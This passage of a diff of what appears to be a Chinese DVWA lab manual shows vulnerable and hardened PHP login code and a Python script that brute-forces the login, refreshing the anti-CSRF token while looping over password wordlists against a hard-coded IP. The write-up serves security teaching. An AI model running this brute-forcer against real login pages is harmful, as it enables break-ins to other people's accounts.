-        <span class="token keyword">echo</span> <span class="token string">"&lt;pre>&lt;br />Username and/or password incorrect.&lt;/pre>"</span><span class="token punctuation">;</span>
-    <span class="token punctuation">}</span>
+        // Login successful
+        echo &quot;&lt;p&gt;Welcome to the password protected area {$user}&lt;/p&gt;&quot;;
+        echo &quot;&lt;img src=\&quot;{$avatar}\&quot; /&gt;&quot;;
+    }
+    else {
+        // Login failed
+        sleep( rand( 0, 3 ) );
+        echo &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;;
+    }
 
-    <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">is_null</span><span class="token punctuation">(</span><span class="token variable">$___mysqli_res</span> <span class="token operator">=</span> <span class="token function">mysqli_close</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token boolean">false</span> <span class="token punctuation">:</span> <span class="token variable">$___mysqli_res</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">}</span>
+    ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);
+}
 
-<span class="token comment" spellcheck="true">// Generate Anti-CSRF token</span>
-<span class="token function">generateSessionToken</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+// Generate Anti-CSRF token
+generateSessionToken();
 
-<span class="token delimiter">?></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+?&gt; </code></pre>
 <p>说明：</p>
 <ul>
 <li>相比Medium级别的代码，High级别的代码主要增加了<code>token</code>校验机制，<code>user_token</code>键值在一定程度上能够防止重放攻击；</li>
@@ -999,57 +998,57 @@ BASE_DIR <span class="token operator">=</span> os<span class="token punctuation"
 <center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/LabManual/BruteForce_result_High.png" alt="BruteForce_result_High"></center>
 
 <p> 方法二：自编写python脚本暴力破解</p>
-<pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># Version: python3</span>
-<span class="token comment" spellcheck="true"># Author: Silence</span>
-<span class="token comment" spellcheck="true"># Encoding: utf-8</span>
+<pre><code class="python"># Version: python3
+# Author: Silence
+# Encoding: utf-8
 
-<span class="token keyword">import</span> os
+import os
 
-<span class="token keyword">import</span> requests
-<span class="token keyword">from</span> pyquery <span class="token keyword">import</span> PyQuery
+import requests
+from pyquery import PyQuery
 
 
-BASE_DIR <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>dirname<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>abspath<span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">)</span>
+BASE_DIR = os.path.dirname(os.path.abspath(__file__))
 
-<span class="token keyword">def</span> <span class="token function">read_file</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">:</span>
-    <span class="token keyword">with</span> open<span class="token punctuation">(</span>path<span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> fhandler<span class="token punctuation">:</span>
-        <span class="token keyword">yield</span> <span class="token keyword">from</span> fhandler
+def read_file(path):
+    with open(path,&#39;r&#39;) as fhandler:
+        yield from fhandler
 
-<span class="token keyword">def</span> <span class="token function">brute_force</span><span class="token punctuation">(</span>addr<span class="token punctuation">,</span>user_token<span class="token operator">=</span>None<span class="token punctuation">,</span>username<span class="token operator">=</span>None<span class="token punctuation">,</span>password<span class="token operator">=</span>None<span class="token punctuation">,</span>headers<span class="token operator">=</span>None<span class="token punctuation">,</span>init<span class="token operator">=</span>Flase<span class="token punctuation">)</span><span class="token punctuation">:</span>
-    url <span class="token operator">=</span> <span class="token string">'http://{0}:{1}/dvwa/vulnerabilities/brute/'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span><span class="token operator">*</span>addr<span class="token punctuation">)</span>
+def brute_force(addr,user_token=None,username=None,password=None,headers=None,init=Flase):
+    url = &#39;http://{0}:{1}/dvwa/vulnerabilities/brute/&#39;.format(*addr)
 
-    params <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
-    <span class="token keyword">if</span> <span class="token operator">not</span> init<span class="token punctuation">:</span>
-        params <span class="token operator">=</span> <span class="token punctuation">{</span>
-            <span class="token string">'user_token'</span><span class="token punctuation">:</span>user_token<span class="token punctuation">,</span>
-            <span class="token string">'username'</span> <span class="token punctuation">:</span> username<span class="token punctuation">,</span>
-            <span class="token string">'password'</span> <span class="token punctuation">:</span> password<span class="token punctuation">,</span>
-            <span class="token string">'Login'</span> <span class="token punctuation">:</span> <span class="token string">'Login'</span>
-    <span class="token punctuation">}</span>
+    params = {}
+    if not init:
+        params = {
+            &#39;user_token&#39;:user_token,
+            &#39;username&#39; : username,
+            &#39;password&#39; : password,
+            &#39;Login&#39; : &#39;Login&#39;
+    }
 
-    response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>params<span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>
-    <span class="token keyword">if</span> response<span class="token punctuation">.</span>ok<span class="token punctuation">:</span>
-        <span class="token keyword">if</span> response<span class="token punctuation">.</span>text<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">'Welcome to the password protected area'</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>
-            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'+'</span><span class="token punctuation">,</span>username<span class="token punctuation">,</span>password<span class="token punctuation">)</span>
+    response = requests.get(url,params,headers=headers)
+    if response.ok:
+        if response.text.find(&#39;Welcome to the password protected area&#39;) != -1:
+            print(&#39;+&#39;,username,password)
 
-        pq <span class="token operator">=</span> PyQuery<span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
-        <span class="token keyword">return</span> pq<span class="token punctuation">(</span><span class="token string">'input[name=user_token]'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>val<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        pq = PyQuery(response.text)
+        return pq(&#39;input[name=user_token]&#39;).val()
 
-    <span class="token keyword">return</span> <span class="token string">''</span>
+    return &#39;&#39;
 
-<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span>addr<span class="token punctuation">,</span>headers<span class="token punctuation">)</span><span class="token punctuation">:</span>
-    user_token <span class="token operator">=</span> brute_force<span class="token punctuation">(</span>addr<span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">,</span>init<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
-    <span class="token keyword">for</span> username <span class="token keyword">in</span> read_file<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>BASE_DIR<span class="token punctuation">,</span><span class="token string">'username.txt'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-        <span class="token keyword">for</span> password <span class="token keyword">in</span> read_file<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>BASE_DIR<span class="token punctuation">,</span><span class="token string">'password.txt'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-            user_token <span class="token operator">=</span> brute_force<span class="token punctuation">(</span>addr<span class="token punctuation">,</span>user_token<span class="token punctuation">,</span>username<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>password<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>headers<span class="token punctuation">)</span>
+def main(addr,headers):
+    user_token = brute_force(addr,headers=headers,init=True)
+    for username in read_file(os.path.join(BASE_DIR,&#39;username.txt&#39;)):
+        for password in read_file(os.path.join(BASE_DIR,&#39;password.txt&#39;)):
+            user_token = brute_force(addr,user_token,username.strip(),password.strip(),headers)
 
-<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
-    server <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'124.70.137.227'</span><span class="token punctuation">,</span><span class="token number">80</span><span class="token punctuation">,</span><span class="token punctuation">)</span>
-    headers <span class="token operator">=</span> <span class="token punctuation">{</span>
-        <span class="token string">'Cookie'</span> <span class="token punctuation">:</span> <span class="token string">'security=high; PHPSESSID=jkaljlp2tsinkkvvi7psh9rb31'</span>
-    <span class="token punctuation">}</span>
-    main<span class="token punctuation">(</span>server<span class="token punctuation">,</span>headers<span class="token punctuation">)</span>
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+if __name__ == &#39;__main__&#39;:
+    server = (&#39;124.70.137.227&#39;,80,)
+    headers = {
+        &#39;Cookie&#39; : &#39;security=high; PHPSESSID=jkaljlp2tsinkkvvi7psh9rb31&#39;
+    }
+    main(server,headers)
+</code></pre>
 <p>使用：</p>
 <ul>
 <li>从浏览器中 copy 登陆成功后的 cookie 信息</li>
@@ -1064,108 +1063,108 @@ BASE_DIR <span class="token operator">=</span> os<span class="token punctuation"
 <center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/LabManual/SecurityLevel_Impossible.png" alt="SecurityLevel_Impossible"></center>
 
 <p><strong>服务器端核心代码</strong>：</p>
-<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<pre><code class="php">&lt;?php
 
-<span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token function">isset</span><span class="token punctuation">(</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span> <span class="token string">'Login'</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span> <span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span> <span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>
-    <span class="token comment" spellcheck="true">// Check Anti-CSRF token</span>
-    <span class="token function">checkToken</span><span class="token punctuation">(</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span> <span class="token string">'user_token'</span> <span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span> <span class="token string">'session_token'</span> <span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'index.php'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
+if( isset( $_POST[ &#39;Login&#39; ] ) &amp;&amp; isset ($_POST[&#39;username&#39;]) &amp;&amp; isset ($_POST[&#39;password&#39;]) ) {
+    // Check Anti-CSRF token
+    checkToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; );
 
-    <span class="token comment" spellcheck="true">// Sanitise username input</span>
-    <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span> <span class="token string">'username'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>
-    <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token function">stripslashes</span><span class="token punctuation">(</span> <span class="token variable">$user</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_object</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">mysqli_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token variable">$user</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">trigger_error</span><span class="token punctuation">(</span><span class="token string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span><span class="token punctuation">,</span> <span class="token constant">E_USER_ERROR</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token string">""</span> <span class="token punctuation">:</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    // Sanitise username input
+    $user = $_POST[ &#39;username&#39; ];
+    $user = stripslashes( $user );
+    $user = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $user ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));
 
-    <span class="token comment" spellcheck="true">// Sanitise password input</span>
-    <span class="token variable">$pass</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span> <span class="token string">'password'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>
-    <span class="token variable">$pass</span> <span class="token operator">=</span> <span class="token function">stripslashes</span><span class="token punctuation">(</span> <span class="token variable">$pass</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token variable">$pass</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_object</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">mysqli_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token variable">$pass</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">trigger_error</span><span class="token punctuation">(</span><span class="token string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span><span class="token punctuation">,</span> <span class="token constant">E_USER_ERROR</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token string">""</span> <span class="token punctuation">:</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token variable">$pass</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span> <span class="token variable">$pass</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
+    // Sanitise password input
+    $pass = $_POST[ &#39;password&#39; ];
+    $pass = stripslashes( $pass );
+    $pass = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));
+    $pass = md5( $pass );
 
-    <span class="token comment" spellcheck="true">// Default values</span>
-    <span class="token variable">$total_failed_login</span> <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>
-    <span class="token variable">$lockout_time</span>       <span class="token operator">=</span> <span class="token number">15</span><span class="token punctuation">;</span>
-    <span class="token variable">$account_locked</span>     <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
+    // Default values
+    $total_failed_login = 3;
+    $lockout_time       = 15;
+    $account_locked     = false;
 
-    <span class="token comment" spellcheck="true">// Check the database (Check user information)</span>
-    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">prepare</span><span class="token punctuation">(</span> <span class="token string">'SELECT failed_login, last_login FROM users WHERE user = (:user) LIMIT 1;'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token variable">$data</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">bindParam</span><span class="token punctuation">(</span> <span class="token string">':user'</span><span class="token punctuation">,</span> <span class="token variable">$user</span><span class="token punctuation">,</span> <span class="token constant">PDO</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">PARAM_STR</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token variable">$data</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token variable">$row</span> <span class="token operator">=</span> <span class="token variable">$data</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">fetch</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    // Check the database (Check user information)
+    $data = $db-&gt;prepare( &#39;SELECT failed_login, last_login FROM users WHERE user = (:user) LIMIT 1;&#39; );
+    $data-&gt;bindParam( &#39;:user&#39;, $user, PDO::PARAM_STR );
+    $data-&gt;execute();
+    $row = $data-&gt;fetch();
 
-    <span class="token comment" spellcheck="true">// Check to see if the user has been locked out.</span>
-    <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token punctuation">(</span> <span class="token variable">$data</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">rowCount</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span> <span class="token variable">$row</span><span class="token punctuation">[</span> <span class="token string">'failed_login'</span> <span class="token punctuation">]</span> <span class="token operator">>=</span> <span class="token variable">$total_failed_login</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>
-        <span class="token comment" spellcheck="true">// User locked out.  Note, using this method would allow for user enumeration!</span>
-        <span class="token comment" spellcheck="true">//echo "</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>pre</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/></span></span></span>This account has been locked due to too many incorrect logins<span class="token punctuation">.</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>pre</span><span class="token punctuation">></span></span></span>"<span class="token punctuation">;</span>
+    // Check to see if the user has been locked out.
+    if( ( $data-&gt;rowCount() == 1 ) &amp;&amp; ( $row[ &#39;failed_login&#39; ] &gt;= $total_failed_login ) )  {
+        // User locked out.  Note, using this method would allow for user enumeration!
+        //echo &quot;&lt;pre&gt;&lt;br /&gt;This account has been locked due to too many incorrect logins.&lt;/pre&gt;&quot;;
 
-        <span class="token comment" spellcheck="true">// Calculate when the user would be allowed to login again</span>
-        <span class="token variable">$last_login</span> <span class="token operator">=</span> <span class="token function">strtotime</span><span class="token punctuation">(</span> <span class="token variable">$row</span><span class="token punctuation">[</span> <span class="token string">'last_login'</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token variable">$timeout</span>    <span class="token operator">=</span> <span class="token variable">$last_login</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token variable">$lockout_time</span> <span class="token operator">*</span> <span class="token number">60</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token variable">$timenow</span>    <span class="token operator">=</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        // Calculate when the user would be allowed to login again
+        $last_login = strtotime( $row[ &#39;last_login&#39; ] );
+        $timeout    = $last_login + ($lockout_time * 60);
+        $timenow    = time();
 
-        <span class="token comment" spellcheck="true">/*
-        print "The last login was: " . date ("h:i:s", $last_login) . "&lt;br />";
-        print "The timenow is: " . date ("h:i:s", $timenow) . "&lt;br />";
-        print "The timeout is: " . date ("h:i:s", $timeout) . "&lt;br />";
-        */</span>
+        /*
+        print &quot;The last login was: &quot; . date (&quot;h:i:s&quot;, $last_login) . &quot;&lt;br /&gt;&quot;;
+        print &quot;The timenow is: &quot; . date (&quot;h:i:s&quot;, $timenow) . &quot;&lt;br /&gt;&quot;;
+        print &quot;The timeout is: &quot; . date (&quot;h:i:s&quot;, $timeout) . &quot;&lt;br /&gt;&quot;;
+        */
 
-        <span class="token comment" spellcheck="true">// Check to see if enough time has passed, if it hasn't locked the account</span>
-        <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token variable">$timenow</span> <span class="token operator">&lt;</span> <span class="token variable">$timeout</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>
-            <span class="token variable">$account_locked</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
-            <span class="token comment" spellcheck="true">// print "The account is locked</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/></span></span></span>"<span class="token punctuation">;</span>
-        <span class="token punctuation">}</span>
-    <span class="token punctuation">}</span>
+        // Check to see if enough time has passed, if it hasn&#39;t locked the account
+        if( $timenow &lt; $timeout ) {
+            $account_locked = true;
+            // print &quot;The account is locked&lt;br /&gt;&quot;;
+        }
+    }
 
-    <span class="token comment" spellcheck="true">// Check the database (if username matches the password)</span>
-    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">prepare</span><span class="token punctuation">(</span> <span class="token string">'SELECT * FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token variable">$data</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">bindParam</span><span class="token punctuation">(</span> <span class="token string">':user'</span><span class="token punctuation">,</span> <span class="token variable">$user</span><span class="token punctuation">,</span> <span class="token constant">PDO</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">PARAM_STR</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token variable">$data</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">bindParam</span><span class="token punctuation">(</span> <span class="token string">':password'</span><span class="token punctuation">,</span> <span class="token variable">$pass</span><span class="token punctuation">,</span> <span class="token constant">PDO</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">PARAM_STR</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token variable">$data</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token variable">$row</span> <span class="token operator">=</span> <span class="token variable">$data</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">fetch</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    // Check the database (if username matches the password)
+    $data = $db-&gt;prepare( &#39;SELECT * FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&#39; );
+    $data-&gt;bindParam( &#39;:user&#39;, $user, PDO::PARAM_STR);
+    $data-&gt;bindParam( &#39;:password&#39;, $pass, PDO::PARAM_STR );
+    $data-&gt;execute();
+    $row = $data-&gt;fetch();
 
-    <span class="token comment" spellcheck="true">// If its a valid login...</span>
-    <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token punctuation">(</span> <span class="token variable">$data</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">rowCount</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span> <span class="token variable">$account_locked</span> <span class="token operator">==</span> <span class="token boolean">false</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>
-        <span class="token comment" spellcheck="true">// Get users details</span>
-        <span class="token variable">$avatar</span>       <span class="token operator">=</span> <span class="token variable">$row</span><span class="token punctuation">[</span> <span class="token string">'avatar'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>
-        <span class="token variable">$failed_login</span> <span class="token operator">=</span> <span class="token variable">$row</span><span class="token punctuation">[</span> <span class="token string">'failed_login'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>
-        <span class="token variable">$last_login</span>   <span class="token operator">=</span> <span class="token variable">$row</span><span class="token punctuation">[</span> <span class="token string">'last_login'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>
+    // If its a valid login...
+    if( ( $data-&gt;rowCount() == 1 ) &amp;&amp; ( $account_locked == false ) ) {
+        // Get users details
+        $avatar       = $row[ &#39;avatar&#39; ];
+        $failed_login = $row[ &#39;failed_login&#39; ];
+        $last_login   = $row[ &#39;last_login&#39; ];
 
-        <span class="token comment" spellcheck="true">// Login successful</span>
-        <span class="token keyword">echo</span> <span class="token string">"&lt;p>Welcome to the password protected area &lt;em>{$user}&lt;/em>&lt;/p>"</span><span class="token punctuation">;</span>
-        <span class="token keyword">echo</span> <span class="token string">"&lt;img src=\"{$avatar}\" />"</span><span class="token punctuation">;</span>
+        // Login successful
+        echo &quot;&lt;p&gt;Welcome to the password protected area &lt;em&gt;{$user}&lt;/em&gt;&lt;/p&gt;&quot;;
+        echo &quot;&lt;img src=\&quot;{$avatar}\&quot; /&gt;&quot;;
 
-        <span class="token comment" spellcheck="true">// Had the account been locked out since last login?</span>
-        <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token variable">$failed_login</span> <span class="token operator">>=</span> <span class="token variable">$total_failed_login</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>
-            <span class="token keyword">echo</span> <span class="token string">"&lt;p>&lt;em>Warning&lt;/em>: Someone might of been brute forcing your account.&lt;/p>"</span><span class="token punctuation">;</span>
-            <span class="token keyword">echo</span> <span class="token string">"&lt;p>Number of login attempts: &lt;em>{$failed_login}&lt;/em>.&lt;br />Last login attempt was at: &lt;em>${last_login}&lt;/em>.&lt;/p>"</span><span class="token punctuation">;</span>
-        <span class="token punctuation">}</span>
+        // Had the account been locked out since last login?
+        if( $failed_login &gt;= $total_failed_login ) {
+            echo &quot;&lt;p&gt;&lt;em&gt;Warning&lt;/em&gt;: Someone might of been brute forcing your account.&lt;/p&gt;&quot;;
+            echo &quot;&lt;p&gt;Number of login attempts: &lt;em&gt;{$failed_login}&lt;/em&gt;.&lt;br /&gt;Last login attempt was at: &lt;em&gt;${last_login}&lt;/em&gt;.&lt;/p&gt;&quot;;
+        }
 
-        <span class="token comment" spellcheck="true">// Reset bad login count</span>
-        <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">prepare</span><span class="token punctuation">(</span> <span class="token string">'UPDATE users SET failed_login = "0" WHERE user = (:user) LIMIT 1;'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token variable">$data</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">bindParam</span><span class="token punctuation">(</span> <span class="token string">':user'</span><span class="token punctuation">,</span> <span class="token variable">$user</span><span class="token punctuation">,</span> <span class="token constant">PDO</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">PARAM_STR</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token variable">$data</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
-        <span class="token comment" spellcheck="true">// Login failed</span>
-        <span class="token function">sleep</span><span class="token punctuation">(</span> <span class="token function">rand</span><span class="token punctuation">(</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">4</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
+        // Reset bad login count
